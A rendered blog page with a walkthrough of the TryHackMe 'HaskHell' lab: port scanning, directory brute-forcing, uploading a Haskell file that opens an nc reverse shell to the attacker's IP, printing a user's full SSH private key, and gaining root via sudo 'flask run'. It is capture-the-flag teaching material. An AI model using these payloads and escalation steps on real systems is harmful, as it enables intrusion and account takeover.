@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tryhackme Haskhell | C:\Users\DcodeZero</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Tryhackme Haskhell" />
+<meta name="author" content="jeevan" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it." />
+<meta property="og:description" content="HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it." />
+<link rel="canonical" href="http://localhost:4000/tryhackme/2020/07/08/Haskhell.html" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/2020/07/08/Haskhell.html" />
+<meta property="og:site_name" content="C:\Users\DcodeZero" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-08T15:04:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Tryhackme Haskhell" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jeevan"},"dateModified":"2020-07-08T15:04:00+05:30","datePublished":"2020-07-08T15:04:00+05:30","description":"HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.","headline":"Tryhackme Haskhell","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/tryhackme/2020/07/08/Haskhell.html"},"url":"http://localhost:4000/tryhackme/2020/07/08/Haskhell.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="C:\Users\DcodeZero" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">C:\Users\DcodeZero<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-red-hover" href="https://dcodezero.github.io/about/"><i class="fab fa-address-card"></i></a>
+        
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/Dcodezer0"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/DcodeZero"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="codedzero@gmail.com"><i class="fab fa-envelope"></i></a>
+        
+        
+        
+        <a class="color-grey-hover" href="https://app.hackthebox.com/profile/291968"><i class="fab fa-user"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.png
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hacker || Red Team || PenTester|| CTF Player || Blogger 
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Tryhackme Haskhell</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/gobuster/">gobuster</a>
+      
+      <a class="tag" href="/tag/boot2root/">boot2root</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 08 Jul 2020
+    
+    by jeevan
+    
+  </div>
+  
+  <noscript>
+    <div class="post-description">HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="lets-get-started">Let’s get started</h2>
+
+<h2 id="nmap-scan">Nmap Scan.</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="no">T4</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> 
+<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">08</span> <span class="mo">03</span><span class="p">:</span><span class="mi">30</span> <span class="no">EDT</span>
+<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">)</span>
+<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">65533</span> <span class="n">closed</span> <span class="n">ports</span>
+<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">1</span><span class="n">d</span><span class="ss">:f3</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f7</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">:a1:d4</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="ss">:dd</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">26</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="ss">:bd</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="ss">:bf</span><span class="p">:</span><span class="mi">09</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">:e3:d3</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">34</span><span class="ss">:bc</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d5</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">55</span><span class="ss">:a0:fd:e8:e1:ab</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">46</span><span class="ss">:af:b8</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Gunicorn</span> <span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">gunicorn</span><span class="o">/</span><span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Homepage</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+
+<span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">657.29</span> <span class="n">seconds</span>
+</code></pre></div></div>
+
+<h3 id="from-the-nmap-scan-i-can-see-that-port-5001-is-the-only-useful-port-that-can-be-enumerated">From the <code class="language-plaintext highlighter-rouge">Nmap</code> scan I can see that port <code class="language-plaintext highlighter-rouge">5001</code> is the only useful port that can be enumerated.</h3>
+
+<p>Having a look on the http site @ 5001 I come to see this page</p>
+
+<p><img src="/assets/img/sample/hask/hask1.jpg" alt="" /></p>
+
+<p>Seeing the hyperlink <code class="language-plaintext highlighter-rouge">homework here</code> I clicked on it and it took me to the page where an assignment can be submitted.</p>
+
+<p><img src="/assets/img/sample/hask/hask2.png" alt="" /></p>
+
+<h3 id="clicking-on-the-submit-button-it-says-that-page-not-found">Clicking on the submit button it says that <code class="language-plaintext highlighter-rouge">PAGE NOT FOUND</code>.</h3>
+
+<p><img src="/assets/img/sample/hask/hask3.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find the directories of the machine.</p>
+
+<h2 id="gobuster">Gobuster</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hask.thm:5001/ <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://hask.thm:5001/
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/07/08 03:33:08 Starting gobuster
+<span class="o">===============================================================</span>
+/submit <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/07/08 03:36:03 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<h3 id="so-its-not-uploads-but-its-submit">So it’s not <code class="language-plaintext highlighter-rouge">uploads</code> but it’s <code class="language-plaintext highlighter-rouge">Submit</code>.</h3>
+
+<h3 id="tried-a-bunch-of-stuff-like-uploading-a-php-shell-and-stuff-like-that-but-nothing-seems-to-be-working">Tried a bunch of stuff like uploading a <code class="language-plaintext highlighter-rouge">PHP</code> shell and stuff like that, but nothing seems to be working.</h3>
+
+<p><img src="/assets/img/sample/hask/hask4.png" alt="" /></p>
+
+<h3 id="remembering-from-previous-pages-this-site-probably-accepts-a-haskell-scripts">Remembering from previous pages this site probably accepts a haskell scripts.</h3>
+
+<h2 id="reverse-shell">Reverse shell</h2>
+
+<h3 id="a-little-bit-research-on-haskell-i-found-that-we-can-call-a-command-using-the-below-script">A little bit research on haskell I found that we can call a command using the below script.</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># cat shell.hs 
+</span><span class="n">module</span> <span class="n">Main</span> <span class="n">where</span>
+
+<span class="kn">import</span> <span class="n">System.Process</span>
+
+<span class="n">main</span> <span class="o">=</span> <span class="n">callCommand</span> <span class="sh">"</span><span class="s">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f</span><span class="sh">"</span>
+</code></pre></div></div>
+
+<h3 id="uploading-the-file-and-starting-up-a-listner-nc--lnvp-5566-and-visiting-the-url-haskthmuploadsshellhs-gave-me-the-reverse-shell">Uploading the file and starting up a listner <code class="language-plaintext highlighter-rouge">nc -lnvp 5566</code> and visiting the url <code class="language-plaintext highlighter-rouge">hask.thm/uploads/shell.hs</code> gave me the reverse shell.</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="o">/</span><span class="no">Haskhell</span><span class="c1"># nc -lnvp 5566</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">5566</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.9</span><span class="o">.</span><span class="mf">2.148</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">]</span> <span class="mi">44224</span>
+<span class="sr">/bin/s</span><span class="ss">h: </span><span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="err">'</span><span class="n">t</span> <span class="n">access</span> <span class="n">tty</span><span class="p">;</span> <span class="n">job</span> <span class="n">control</span> <span class="n">turned</span> <span class="n">off</span>
+<span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span>
+<span class="err">$</span> 
+</code></pre></div></div>
+
+<blockquote>
+  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
+</blockquote>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flask@haskhell:/home<span class="nv">$ </span><span class="nb">ls
+</span>flask  haskell  prof
+flask@haskhell:/home<span class="nv">$ </span>
+flask@haskhell:/home<span class="nv">$ </span><span class="nb">cd </span>prof
+<span class="nb">cd </span>prof
+flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">ls
+ls
+</span>__pycache__  user.txt
+flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+flag<span class="o">{</span><span class="nt">--------------</span><span class="o">}</span>
+
+</code></pre></div></div>
+<h3 id="from-here-i-see-a-ssh-folder-which-contains-the-id_rsa-of-professor-so-i-copied-that-to-my-kali-and-used-ssh-to-login-as-prof">From here I see a <code class="language-plaintext highlighter-rouge">.ssh</code> folder which contains the <code class="language-plaintext highlighter-rouge">id_rsa</code> of professor, So I copied that to my <code class="language-plaintext highlighter-rouge">kali</code> and used <code class="language-plaintext highlighter-rouge">ssh</code> to login as <code class="language-plaintext highlighter-rouge">prof</code>.</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flask</span><span class="vi">@haskhell</span><span class="ss">:/</span><span class="n">home</span><span class="o">/</span><span class="n">prof</span><span class="o">/</span><span class="p">.</span><span class="nf">ssh</span><span class="err">$</span> <span class="n">cat</span> <span class="n">id_rsa</span>
+<span class="n">cat</span> <span class="n">id_rsa</span>
+<span class="o">-----</span><span class="k">BEGIN</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
+<span class="no">MIIEpAIBAAKCAQEA068E6x8</span><span class="o">/</span><span class="n">vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr</span>
+<span class="mi">94</span><span class="n">rYpUPcxxxYyw</span><span class="o">/</span><span class="n">dAii0W6srQuRCAbQxO5Di</span><span class="o">+</span><span class="n">tv9aWXmBGMEt0</span><span class="o">/</span><span class="mi">3</span><span class="n">tOE7D09RhZGQ</span>
+<span class="n">b68lAFDjSSJaVlVzPi</span><span class="o">+</span><span class="n">waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss</span>
+<span class="no">Nb</span><span class="o">+</span><span class="mi">7</span><span class="no">UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7</span><span class="o">+</span><span class="n">iObamfGlZ4QQ5IvUj0etStDD6iU</span>
+<span class="no">WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2</span><span class="o">++</span>
+<span class="mi">6</span><span class="no">ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf</span><span class="o">+</span><span class="n">wQXvtrq</span>
+<span class="no">XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob</span>
+<span class="n">wSsR3TTTci0JIP4CQs4</span><span class="o">+</span><span class="n">nez96DNl</span><span class="o">+</span><span class="mi">6</span><span class="no">IUmhawcDfrtlGwwZ</span><span class="o">/</span><span class="no">JsvPDYujnyziN</span><span class="o">+</span><span class="no">KTr</span>
+<span class="mi">7</span><span class="n">ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS</span><span class="o">/</span><span class="n">xWzW3i7F</span>
+<span class="n">gAoYxc6</span><span class="o">+</span><span class="mi">4</span><span class="n">s5bKHsJima2Aj5F3XtHfipkMdBvbl</span><span class="o">+</span><span class="n">sjGllgiQn</span><span class="o">/</span><span class="n">oEjYMIX5wc7</span><span class="o">+</span><span class="n">se2</span>
+<span class="n">o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs</span><span class="o">/</span><span class="no">RHQ7IQ4F3yp</span><span class="o">/</span><span class="no">G67</span>
+<span class="mi">54</span><span class="n">oLue6hAoGBAPCe</span><span class="o">+</span><span class="no">WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll</span>
+<span class="no">B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ</span>
+<span class="no">LJN</span><span class="o">+</span><span class="mi">0</span><span class="n">p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS</span><span class="o">+</span><span class="n">e1ks7nlQKiBuD</span><span class="o">/</span><span class="no">AoGBAOE2</span>
+<span class="n">kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL</span><span class="o">/</span><span class="no">AQltQkkLtQPdUPJgdY</span>
+<span class="mi">3</span><span class="n">gOkUJ2BCHNlIsAtUjrTj</span><span class="o">+</span><span class="no">T76N512rO2sSidOEXRDCc</span><span class="o">+</span><span class="n">g</span><span class="o">/</span><span class="no">QwdgENiq</span><span class="o">/</span><span class="n">w9JroeWFc</span>
+<span class="n">g9qM3f2cl</span><span class="o">/</span><span class="no">EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc</span><span class="o">+</span><span class="mi">4</span><span class="no">ZWvoUNUzwCY2D</span>
+<span class="n">eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE</span><span class="o">+</span><span class="no">J6U</span>
+<span class="sr">/cU+/o</span><span class="mi">19</span><span class="no">WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd</span><span class="o">/</span><span class="n">j</span>
+<span class="no">BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe</span><span class="o">+</span><span class="no">OZ</span><span class="o">+</span><span class="no">Swezjfw5Ro3YdkmWsnGTc</span>
+<span class="no">ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0</span><span class="o">+</span><span class="n">eqI2WMghp60eUX4LBinb71cihCnrz9S</span>
+<span class="sr">/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/</span><span class="no">IkwQa</span><span class="o">+</span><span class="no">NI5BVVmZahN9</span><span class="o">/</span><span class="n">sXF</span>
+<span class="n">yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY</span><span class="o">/</span><span class="mi">2</span><span class="n">hS0WO3XGQtx6HBwg6jJKw</span>
+<span class="no">MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y</span><span class="o">+</span><span class="n">iadGfIbStSZzN4nItF5</span><span class="o">+</span><span class="n">yC42Q2wlhtwgt</span>
+<span class="n">i4MU8bepL</span><span class="o">/</span><span class="no">GTMgaiR8RmU2qY7wRxfK2Yd</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="no">GDuzLPEoS7ONNjLhNA</span><span class="o">==</span>
+<span class="o">-----</span><span class="k">END</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
+</code></pre></div></div>
+<h2 id="ssh-to-prof">SSH to Prof</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># ssh -i id_rsa prof@hask.thm
+</span><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="sh">'</span><span class="s">hask.thm (10.10.129.213)</span><span class="sh">'</span> <span class="n">can</span><span class="sh">'</span><span class="s">t be established.
+ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added </span><span class="sh">'</span><span class="n">hask</span><span class="p">.</span><span class="n">thm</span><span class="p">,</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">129.213</span><span class="sh">'</span><span class="s"> (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jul  8 08:06:37 UTC 2020
+
+  System load:  0.0                Processes:           108
+  Usage of /:   26.3% of 19.56GB   Users logged in:     0
+  Memory usage: 48%                IP address for eth0: 10.10.129.213
+  Swap usage:   0%
+
+
+39 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
+$ id
+uid=1002(prof) gid=1002(prof) groups=1002(prof)
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+$ python -c 'import pty;pty.spawn("/bin/bash");'
+prof@haskhell:~$ 
+
+</code></pre></div></div>
+
+<h2 id="checking-the-priv-of-prof">Checking the priv of <code class="language-plaintext highlighter-rouge">prof</code></h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>prof on haskhell:
+    env_reset, env_keep+<span class="o">=</span>FLASK_APP, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User prof may run the following commands on haskhell:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/flask run
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span>nano root.py
+import os
+os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
+prof@haskhell:~<span class="nv">$ </span>nano root.py
+prof@haskhell:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">FLASK_APP</span><span class="o">=</span>root.py
+prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo </span>flask run
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># cat /root/root.txt</span>
+flag<span class="o">{</span><span class="k">*****************</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/tryhackme/2020/07/08/Haskhell.html';
+     this.page.identifier = '/tryhackme/2020/07/08/Haskhell';
+     this.page.title = 'Tryhackme Haskhell';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/otherposts/2020/10/17/OSCP.html">
+            My  journey  towards  "TRY  HARDER!"
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/23/Buff.html">
+            HackTheBox Buff
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/11/Blackfield.html">
+            Hackthebox Blackfiled
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/oscp/" class="set-1">OSCP</a> <a href="/tag/tryharder/" class="set-1">TryHarder</a> <a href="/tag/activedirectory/" class="set-3">activedirectory</a> <a href="/tag/bloodhound/" class="set-1">bloodhound</a> <a href="/tag/bludit/" class="set-1">bludit</a> <a href="/tag/boot2root/" class="set-2">boot2root</a> <a href="/tag/crackmapexec/" class="set-1">crackmapexec</a> <a href="/tag/cve/" class="set-1">cve</a> <a href="/tag/dnspy/" class="set-1">dnspy</a> <a href="/tag/evilwinrm/" class="set-3">evilwinrm</a> <a href="/tag/gobuster/" class="set-4">gobuster</a> <a href="/tag/hashcat/" class="set-2">hashcat</a> <a href="/tag/impacket/" class="set-3">impacket</a> <a href="/tag/john/" class="set-1">john</a> <a href="/tag/ldapsearch/" class="set-1">ldapsearch</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lsass/" class="set-1">lsass</a> <a href="/tag/lxd/" class="set-1">lxd</a> <a href="/tag/metasploit/" class="set-2">metasploit</a> <a href="/tag/mimikatz/" class="set-1">mimikatz</a> <a href="/tag/portforwarding/" class="set-1">portforwarding</a> <a href="/tag/rpcclient/" class="set-3">rpcclient</a> <a href="/tag/smb/" class="set-1">smb</a> <a href="/tag/tomcat/" class="set-1">tomcat</a> <a href="/tag/windows/" class="set-5">windows</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'HaskHell is medium level machine in TryHackMe. It is based on uploading unrestricted file uploads and exploiting it.';
+  const speed = parseInt('70');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
